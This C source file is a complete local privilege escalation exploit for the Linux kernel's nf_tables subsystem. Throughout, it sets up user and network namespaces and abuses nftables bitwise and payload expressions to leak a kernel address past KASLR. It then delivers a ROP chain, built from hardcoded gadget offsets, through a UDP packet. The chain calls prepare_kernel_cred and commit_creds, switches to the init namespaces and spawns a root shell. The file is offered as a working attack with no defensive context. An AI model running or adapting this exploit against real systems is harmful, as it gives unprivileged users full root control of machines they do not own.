
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include <time.h>
#include <stdlib.h>
#include <string.h>


#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <pthread.h>
#include <inttypes.h>
#include <assert.h>

#include <sched.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>



#define release_sock_63 0x9bfc63
#define __napi_poll_49  0xa21571
#define DATAGRAM_LEN 4096
#define OPT_SIZE 20
#define prepare_kernel_cred 0xd2bf0 
#define commit_creds 0xd26a0
#define switch_task_namespaces 0xd12c0
#define find_task_by_vpid 0xc8db0
#define pop_rdi_ret 0x92100
#define pop_rsi_ret 0x223e6
#define cli_ret 0x5b98c
#define swapgs_ret 0xc966bf
#define init_nsproxy 0x186d940
#define mov_rdi_rax_ret 0x2bfb1
#define iretq 0x3fbc4
#define swapgs_restore_regs_and_return_to_usermodegs_and_ret 0xe0100b



unsigned long* new_stack;
unsigned long stack_addr;

typedef struct listener_data {
	uint16_t port;
	char address[8];
} listener_data;

enum rule_call_types {
	RULE_ADDRESS_LEAK,
	RULE_ROP_CHAIN,
	RULE_INBOUND_OUTBOUND,
	RULE_PORT_CHECK
};

typedef struct udp_data {
	char* data;
	size_t size;
	uint16_t port;
	char* addr;
	size_t addr_size;
} udp_data;


void *send_udp_packet(void *arg);

static struct nftnl_table *table_add_parse(char* table_name) {
	struct nftnl_table *t; // create struct
	uint16_t family = AF_INET; // the family of the table
	t = nftnl_table_alloc(); // allocate the table
	if (t == NULL) {
		perror("[!] Couldn't allocate a table");
		exit(EXIT_FAILURE);
	}

	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family); // set the family
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); // set the name

	return t;
}

static struct nftnl_chain *chain_add_parse(char* table_name, char* chain_name, int hooknum)
{
	struct nftnl_chain *t;
	//int hooknum = NF_INET_LOCAL_OUT;

	t = nftnl_chain_alloc();
	if (t == NULL) {
		perror("[!] Couldn't allocate a chain");
		return NULL;
	}
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); // set priority to 0
	nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hooknum);
	return t;
}

void setup_table_and_chain(char* table_name, char* base_chain_name, int hooknum){
	char buf_table[MNL_SOCKET_BUFFER_SIZE];
	char buf_chain[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh; // netlink message header
	uint32_t portid, t_seq, c_seq, table_seq, chain_seq, family;
	struct nftnl_table *t_table; // netfilter netlink table
	struct nftnl_chain *t_chain;
	struct mnl_nlmsg_batch *batch_table, *batch_chain;
	int ret;


	// **** TABLE SETUP ****

	t_table = table_add_parse(table_name); // the table
	t_seq = time(NULL); // t sequence num
	batch_table = mnl_nlmsg_batch_start(buf_table, sizeof(buf_table)); // starts a batch of messages
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_table), t_seq++); // 'begins' the batch

	mnl_nlmsg_batch_next(batch_table); // denominates that a new message starts
	table_seq = t_seq;
	family = nftnl_table_get_u32(t_table, NFTNL_TABLE_FAMILY); // get the family back?
	nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_table), // build the netlink header
					NFT_MSG_NEWTABLE, family,
					NLM_F_CREATE|NLM_F_ACK, t_seq++);
	nftnl_table_nlmsg_build_payload(nlh, t_table); // build the payload
	nftnl_table_free(t_table); // free the allocated table
	mnl_nlmsg_batch_next(batch_table); // denominates that a new message can start

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_table), t_seq++); // ends the nftnl batch section
	mnl_nlmsg_batch_next(batch_table);


	// **** CHAIN SETUP ****

	c_seq = time(NULL); // sequence num
	t_chain = chain_add_parse(table_name, base_chain_name, hooknum);
	batch_chain = mnl_nlmsg_batch_start(buf_chain, sizeof(buf_chain)); // starts a batch of messages
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_chain), c_seq++);
	mnl_nlmsg_batch_next(batch_chain);
	chain_seq = c_seq;
	family = NFPROTO_IPV4;
	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_chain),
					NFT_MSG_NEWCHAIN, family,
					NLM_F_CREATE|NLM_F_ACK, c_seq++);
	nftnl_chain_nlmsg_build_payload(nlh, t_chain);
	nftnl_chain_free(t_chain); // free the allocated chain
	mnl_nlmsg_batch_next(batch_chain); // denominates that a new message can start

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_chain), c_seq++); // nftnl batch section
	mnl_nlmsg_batch_next(batch_chain);


	// *** SETTING UP THE SOCKET ***
 	struct mnl_socket* nl_soc = mnl_socket_open(NETLINK_NETFILTER); // netlink socket
	if(nl_soc == NULL){
		perror("[!] mnl_socket_open");
		exit(EXIT_FAILURE);
	}


	if(mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0){ // attempt to bind
		perror("[!] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	printf("[*] Socket is opened. \n");

	portid = mnl_socket_get_portid(nl_soc); // gets the portid

	// *** SENDING TABLE BATCH ***
	if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_table),
			      mnl_nlmsg_batch_size(batch_table)) < 0) {
		perror("[!] mnl_socket_send *table*");
		exit(EXIT_FAILURE);
	}
	mnl_nlmsg_batch_stop(batch_table); // stop the batch

	ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
	while (ret > 0) {
		ret = mnl_cb_run(buf_table, ret, table_seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
	}

	if (ret == -1) {
		perror("[!] Error adding table");
		exit(EXIT_FAILURE);
	}
	printf("[*] Table %s created. \n", table_name);

	// *** SENDING CHAIN BATCH ***
	if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_chain),
			      mnl_nlmsg_batch_size(batch_chain)) < 0) {
		perror("[!] mnl_socket_send *chain*");
		exit(EXIT_FAILURE);
	}
	mnl_nlmsg_batch_stop(batch_chain); // stop the batch

	ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
	while (ret > 0) {
		ret = mnl_cb_run(buf_chain, ret, chain_seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
	}

	if (ret == -1) {
		perror("[!] Error adding chain");
		exit(EXIT_FAILURE);
	}
	printf("[*] Chain %s created. \n", base_chain_name);

	mnl_socket_close(nl_soc);
}


static void add_bitwise(struct nftnl_rule *r, uint32_t shift_type, uint32_t expr_len,
    uint32_t expr_sreg, uint32_t expr_dreg, void* data, uint32_t data_len)
{

	if(expr_len > 0xff) {
		printf("Bitwise len is over 0xff \n");
		exit(EXIT_FAILURE);
	}

	struct nftnl_expr* e;
	e = nftnl_expr_alloc("bitwise");

	nftnl_expr_set_u32(e, NFTA_BITWISE_SREG, expr_sreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_DREG, expr_dreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_OP, shift_type);
	nftnl_expr_set_u32(e, NFTA_BITWISE_LEN, expr_len);
	nftnl_expr_set_data(e, NFTA_BITWISE_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);

}

static void add_payload_set(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t sreg){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("payload");

	nftnl_expr_set_u32(e, NFTA_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_LEN, len);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_SREG, sreg);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_BASE, base);
	nftnl_expr_set_u32(e, NFTA_PAYLOAD_CSUM_TYPE, NFT_PAYLOAD_CSUM_NONE);

	nftnl_rule_add_expr(r, e);

}

static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg) {
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("payload");

	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);

	nftnl_rule_add_expr(r, e);

}

static void add_cmp(struct nftnl_rule *r, uint32_t op, uint32_t sreg, void* data, size_t data_len){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("cmp");
	nftnl_expr_set_u32(e, NFTA_CMP_OP, op);
	nftnl_expr_set_u32(e, NFTA_CMP_SREG, sreg);
	nftnl_expr_set_data(e, NFTA_CMP_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);
}
static void set_verdict(struct nftnl_rule* r, uint32_t verdict)
{
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("immediate");

	nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, 0); // 0 is verdict register

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); // send the verdict
	nftnl_rule_add_expr(r, e);
}

static void set_register_to_value(struct nftnl_rule* r, uint32_t dreg, void* data, size_t data_len){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("immediate");

	nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, dreg);

	nftnl_expr_set_data(e, NFTA_IMMEDIATE_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);

}



static struct nftnl_rule* setup_leak_address_rule(uint8_t family, const char *table,
				   const char *chain, uint16_t port)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc(); // attemps to allocate the rule
	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// *** CHECK PORT TO REDUCE NOISE ***
	// first we have to copy the port into a register
	// important: the destination port is at offset 2 bytes of the udp header
	// the port's size is also 2 bytes
	// we will copy it to (small) register 1
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);

	// now we compare the port at register NFT_REG32_01 to the actual port where we will be sending stuff
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &port_net, sizeof port_net);


	// *** PREPARE BITWISE EXPRESSION ***
	// This expression will be used to leak the address and save it
	// into a register
	uint32_t bitwise_len = 0x20; // the address is 8 bytes
	uint32_t bitwise_sreg = 0x80000000; // 0xfe * 4 = 0x3f8 (0x3c0 + 0x38) -> where the kernel address is
	uint32_t bitwise_dreg = NFT_REG32_05; // we write it into the first register
	uint32_t bitwise_shift_value_data = 0; // we set the shift value to 0 (that's the data)
	uint32_t bitwise_shift_type = NFT_BITWISE_RSHIFT; // must be NFT_BITWISE_LSHIFT or NFT_BITWISE_RSHIFT


	add_bitwise(r, bitwise_shift_type, bitwise_len, bitwise_sreg, bitwise_dreg, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));
	printf("[*] Bitwise expression is setup! \n");

	// *** PREPARE PAYLOAD SET EXPRESSION ***
	// This expression will be used to get the address from a register and write it
	// into the packet
	uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
	uint32_t payload_offset = 8; // we set the offset to after the UDP header.
	uint32_t payload_len = 0x8; // 8 bytes -> the address
	uint32_t payload_sreg = NFT_REG32_05; // we get it from the first register

	add_payload_set(r, payload_base, payload_offset, payload_len, payload_sreg);
	printf("[*] Payload expression is setup! \n");


	// *** SET THE VERDICT TO CONTINUE ***
	set_verdict(r, NFT_CONTINUE);
	printf("[*] Verdict is setup! \n");

	return r;
}

/* EXPLOIT SECTION - ROP STUFF, SHELLS, ETC */
extern void spawnShell(){
	printf("[***] Exploit ran successfully \n");
	system("id");
	system("/bin/sh"); // we just spawn a shell
}

unsigned long user_cs, user_ss, user_sp, user_rflags;
void save_userland_registers(){
 __asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;" // saves the cs register
		"mov user_ss, ss;" // saves the ss register
		"mov user_sp, rsp;" // saves the stack pointer
		"pushf;" // pushes the flags on the stack
		"pop user_rflags;" // pops the flags from the stack to user_rflags
		".att_syntax;"
 );
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n\n", user_rflags);

}

static struct nftnl_rule* check_port(uint8_t family, const char *table_name,
 const char* chain_name, uint64_t kbase, uint16_t port){
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();
	
	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// *** CHECK PORT TO REDUCE NOISE ***
	// first we have to copy the port into a register
	// important: the destination port is at offset 2 bytes of the udp header
	// the port's size is also 2 bytes
	// we will copy it to (small) register 1
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);
	// now we compare the port at register NFT_REG32_01 to the actual port where we will be sending stuff
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_CMP_NEQ, NFT_REG32_01, &port_net, sizeof port_net);
	set_verdict(r, NF_ACCEPT); // if the port is not the same directly accept the packet without performing other expressions
	return r;
}

static struct nftnl_rule* check_inbound_or_outbound_rule(uint8_t family, const char *table_name,
 const char* chain_name, uint64_t kbase, uint16_t port){
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();
	
	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	
	/* EXPRESSIONS TO CHECK IF IT IS INBOUND OR OUTBOUND */
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0x88, 8, NFT_REG32_01); // we get the first word of the payload before we overwrite it
	
	// now we change the first word
	uint64_t new_first_word = 0xffffffffffffffff; // we will set the first word to 8 bytes of 0xff
	set_register_to_value(r, NFT_REG32_06, &new_first_word, sizeof new_first_word); // we set a register to the new word
	add_payload_set(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0x88, 8, NFT_REG32_06); // we set the word no matter what it was

	uint64_t zeroed_word = 0x0;
	// and now we will actually check what the word was
	add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &zeroed_word, sizeof zeroed_word); 
	// if the word is 0x0 before we changed it -> the cmp is true -> packet is accepted
	// if the word was not 0x0 before we changed it -> the cmp is false -> goes to next rule
	// > if the word was 0x0 before we changed it -> it will skip the rest of the expressions in the rule
	// > if it wasn't it will go down the rules
	
	set_verdict(r, NF_ACCEPT); // NF_ACCEPT will skip all the other rules in the chain and just accept the packet
	// that is what we do if it outbound - accepting it directly will not inject the chain
	return r;
}
static struct nftnl_rule* setup_rop_chain_rules(uint8_t family, const char *table_name,
 const char* chain_name, uint64_t kbase, uint16_t port){
	struct nftnl_rule *r = NULL;
	r = nftnl_rule_alloc();

	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);


	/* RULE TO COPY THE ROP CHAIN */
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0x8, 0xc8, 0xffffffdc);

	
	// *** SET THE VERDICT TO CONTINUE ***
	set_verdict(r, NF_ACCEPT);
	return r;
}

void add_rule(char* table_name, char* base_chain, char ruletype, uint16_t port,
 uint64_t kbase){
	struct mnl_socket *nl_soc;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	int ret;

	family = NFPROTO_IPV4;

	if (ruletype == RULE_ADDRESS_LEAK)
		r = setup_leak_address_rule(family, table_name, base_chain, port);
	else if(ruletype == RULE_ROP_CHAIN)
		r = setup_rop_chain_rules(family, table_name, base_chain, kbase, port);
	else if(ruletype == RULE_INBOUND_OUTBOUND)
		r = check_inbound_or_outbound_rule(family, table_name, base_chain, kbase, port); 
	else if(ruletype == RULE_PORT_CHECK)
		r = check_port(family, table_name, base_chain, kbase, port);
	else {
		printf("[!] No such rule code \n");
		exit(EXIT_FAILURE);
	}
	nl_soc = mnl_socket_open(NETLINK_NETFILTER);
	if (nl_soc == NULL) {
		perror("[!] mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("[!] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
		NFT_MSG_NEWRULE,
		nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
		NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
	nftnl_rule_nlmsg_build_payload(nlh, r);
	nftnl_rule_free(r);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	ret = mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("[!] mnl_socket_sendto *rule*");
		exit(EXIT_FAILURE);
	}

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl_soc, buf, sizeof(buf));
	if (ret == -1) {
		perror("[!] mnl_socket_recvfrom");
		exit(EXIT_FAILURE);
	}

	ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl_soc), NULL, NULL);
	if (ret < 0) {
		perror("[!] mnl_cb_run");
		exit(EXIT_FAILURE);
	}

	mnl_socket_close(nl_soc);

}

void *receive_address(void *arg){

	listener_data *ldata = (listener_data *) arg;
	uint16_t port = ldata->port;

	char message[8];
	bzero(message, 8);
	int bytes;
	int ret;

	int soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	if (soc < 0) {
			perror("[!] Error setting up UDP socket");
			exit(EXIT_FAILURE);
	}

	int reuse_address = 1;

	setsockopt(soc, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof reuse_address);

	struct sockaddr_in addr;
	inet_aton("127.0.0.1", &addr.sin_addr);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);


	ret = bind(soc, (struct sockaddr*)&addr, sizeof(addr));
	if (ret < 0) {
			perror("[!] Problem binding");
			exit(EXIT_FAILURE);
	}
	printf("[*] Listening on port %d \n", port);
	bytes = recvfrom(soc, (char *)message, sizeof message, MSG_WAITALL, (struct sockaddr *)&addr, sizeof(addr));
	message[bytes] = '\0';
	// while ((bytes = read(soc, message, 1024)) > 0) {
	// 	break;
	// }
	memcpy(&ldata->address, &message, 16);
	pthread_exit(NULL);
}

void *send_udp_packet(void *arg){
	// first lets sleep for a second to wait for the listener to be setup
	sleep(0.5);
	udp_data *udata = (udp_data *) arg;
	size_t size = udata->size;
	char* data = udata->data;
	uint16_t port = udata->port;
	char* dest_addr = udata->addr;

	int sock;
	struct sockaddr_in addr;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(dest_addr);

	sendto(sock, data, size, 0, (struct sockaddr *)&addr, sizeof(addr));

	close(sock);

	pthread_exit(NULL);
}

void write_to_file(const char *which, const char *format, ...) {
  FILE * fu = fopen(which, "w");
  va_list args;
  va_start(args, format);
  if (vfprintf(fu, format, args) < 0) {
    perror("cannot write");
    exit(1);
  }
  fclose(fu);
}


void setup_user_and_network_ns(void) {
	uid_t uid = getuid();
	gid_t gid = getgid();	

  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);	
  }
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);	
  }

  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    perror("[-] sched_setaffinity");
		exit(EXIT_FAILURE);	
  }

	// now we map uid and gid
	write_to_file("/proc/self/uid_map", "0 %d 1", uid);
  // deny setgroups (see user_namespaces(7))
  write_to_file("/proc/self/setgroups", "deny");
  // remap gid
  write_to_file("/proc/self/gid_map", "0 %d 1", gid);

}

int main(){

	uint64_t leaked_kernel_address;
	uint64_t kbase; // the kernel base
	pid_t process_id = getpid(); // pid will not be changed by namespace creation
	system("id");
	printf("[*] Setting up user+network namespace sandbox \n\n");
	setup_user_and_network_ns();
//	system("/bin/sh"); // to test out the namespace
	system("ip link set dev lo up"); // setting the loopback up 
	printf("[+] STAGE 1: KASLR bypass\n");
	/* ADDRESS LEAKING STAGE */
	char *leak_table_name = "leak_table",
			 *leak_base_chain_name = "output_chain";

	// first setup the table and chain with output hook
	setup_table_and_chain(leak_table_name, leak_base_chain_name, NF_INET_LOCAL_IN);

	uint16_t port = 50005;

	// we setup the rules that will allow us to leak the address
	add_rule(leak_table_name, leak_base_chain_name, RULE_ADDRESS_LEAK, port, 0);

	printf("[*] Address leak rule created! \n");
	// lets actually leak this bad boy
	pthread_t thread_id_send;
	struct udp_data dummy_data;
	char* As = "AAAAAAAA";
	char* dest_addr = "127.0.0.1";
	dummy_data.data = As;
	dummy_data.size = sizeof(dummy_data.data) / sizeof(char);
	dummy_data.port = port;
	dummy_data.addr = dest_addr;
	dummy_data.addr_size = sizeof(dummy_data.addr);
	pthread_create(&thread_id_send, NULL, send_udp_packet, (void *)&dummy_data);
	
	// lets receive the address
	struct listener_data ldata;
	ldata.port = port;
	bzero(ldata.address, 8);
	pthread_t thread_id_receive;
	pthread_create(&thread_id_receive, NULL, receive_address, (void *)&ldata);

	printf("[*] Packet sent... if no output in a second - it has failed \n");
	pthread_join(thread_id_send, NULL);
	pthread_join(thread_id_receive, NULL);

	leaked_kernel_address = *(uint64_t *)ldata.address;
	printf("[&] Leaked Address: 0x%" PRIx64 "\n", leaked_kernel_address);
	kbase = leaked_kernel_address - __napi_poll_49;
	printf("[&] Kernel base address: 0x%" PRIx64 "\n\n", kbase);
	
	
	/* ROP STAGE */

	uint16_t rop_port = 50006; // we set another port for the rop triggering stage

	char *rop_table_name = "rop_table",
			 *rop_base_chain_name = "output_chain";


	printf("[+] STAGE 2: Escalation \n");
	

	setup_table_and_chain(rop_table_name, rop_base_chain_name, NF_INET_LOCAL_OUT);	
	add_rule(rop_table_name, rop_base_chain_name, RULE_PORT_CHECK, rop_port, kbase);
	add_rule(rop_table_name, rop_base_chain_name, RULE_ROP_CHAIN, rop_port, kbase);
	
	

	printf("[*] Copy ROP-to-Stack rules created. \n");
	save_userland_registers();
	pthread_t send;
	struct udp_data data;
	unsigned int payload_size = 25;
	int offset = 0;
	unsigned long payload[payload_size];
	payload[offset++] = cli_ret + kbase;
	payload[offset++] = pop_rdi_ret + kbase;
	payload[offset++] = 0;
	payload[offset++] = prepare_kernel_cred + kbase;
	//0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;
	payload[offset++] = mov_rdi_rax_ret + kbase;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = commit_creds + kbase;
	payload[offset++] = pop_rdi_ret + kbase;
	payload[offset++] = process_id;
	payload[offset++] = find_task_by_vpid + kbase;
	payload[offset++] = mov_rdi_rax_ret + kbase;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rsi_ret + kbase;
	payload[offset++] = init_nsproxy + kbase;
	payload[offset++] = switch_task_namespaces + kbase;
	payload[offset++] = swapgs_restore_regs_and_return_to_usermodegs_and_ret + kbase;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long )spawnShell;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;
	printf("[&] swapgs_restore_regs_and_return_to_usermodegs_and_ret Address: 0x%" PRIx64 "\n", swapgs_restore_regs_and_return_to_usermodegs_and_ret + kbase);	
	char* rop_dest_addr = "127.0.0.1";
	data.data = (char *)payload;
	data.size = 8 * payload_size;
	data.port = rop_port;
	data.addr = rop_dest_addr;
	data.addr_size = sizeof(data.addr);
	pthread_create(&send, NULL, send_udp_packet, (void *)&data);
	pthread_join(send, NULL);
	return 0;
}
